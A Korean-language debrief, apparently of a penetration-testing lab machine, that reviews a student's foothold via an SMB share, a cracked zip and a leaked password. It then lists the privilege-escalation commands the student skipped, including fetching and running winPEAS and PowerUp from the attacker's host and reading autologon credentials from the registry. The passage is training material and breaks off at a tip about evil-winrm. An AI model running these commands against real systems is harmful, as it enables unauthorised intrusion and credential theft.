## 복기
좋은 기록입니다 — 그리고 **어디서 멈췄는지가 명확하게 보입니다.** 객관적으로 분석하겠습니다.

**잘한 것 (local.txt 10점 = 교과서적 foothold):**  
SMB 널/게스트 → `AnneAuto` 공유 → `emails.zip` → zip2john/john으로 `1chief` 크랙 → 이메일에서 `grep passw`로 `Voltaic1992` 발견 → sasha 자격증명 검증 → feroxbuster로 `/launch6`(PowerShell Web Access) 발견 → 로그인 → 콘솔 → local.txt. 이 흐름은 정말 깔끔합니다. "SMB 공유 → 크리덴셜 → 웹 로그인 → 셸"을 정확히 밟았어요.

**막힌 지점 (proof.txt 10점 실패):**  
글이 **`whoami /all`에서 끝납니다.** 출력을 보면:

```
PRIVILEGES: SeChangeNotifyPrivilege, SeIncreaseWorkingSetPrivilege  ← 둘 다 기본, juicy 없음
GROUPS: Remote Management Users, Users, Medium integrity
```

juicy 권한이 없으니 **여기서 멈춘 겁니다.** 이게 정확히 당신이 계속 겪는 그 패턴 — **"whoami /priv에 SeImpersonate가 없다 → 막혔다"**.

**핵심 실수 하나:** `whoami /priv`에 juicy 권한이 없는 건 **막힘이 아니라 "다른 벡터로 전환하라"는 신호**입니다. 그런데 기록에 **winPEAS를 돌린 흔적이 없습니다.** 토큰 권한 하나만 보고 멈춘 거예요. Windows 단독 privesc는 SeImpersonate 말고도 **서비스 오설정·AlwaysInstallElevated·크리덴셜·설치SW**가 있고, 이건 winPEAS가 자동으로 찾아줍니다.

**했어야 할 것 (proof.txt까지):**

powershell

```powershell
#1) winPEAS — 이걸 안 돌린 게 결정적
iwr http://tun0IP/winPEASx64.exe -o wp.exe; .\wp.exe
#또는 PowerUp
iex(iwr http://tun0IP/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks
#2) 서비스 오설정
Get-CimInstance Win32_Service | ?{$_.PathName -notmatch '"' -and $_.PathName -match ' '} | select Name,PathName,StartMode  # unquoted path
accesschk.exe -uwcqv sasha *          # 약한 서비스 권한
#3) AlwaysInstallElevated
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
#4) 크리덴셜·자동로그인
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
cmdkey /list
#5) 설치된 비표준 소프트웨어 (취약점)

```

**실전 팁 하나:** sasha가 **Remote Management Users** 소속이니, PSWA 콘솔(제약적일 수 있음) 대신 **evil-winrm**으로 붙으면 winPEAS 업로드·enum이 훨씬 편합니다:
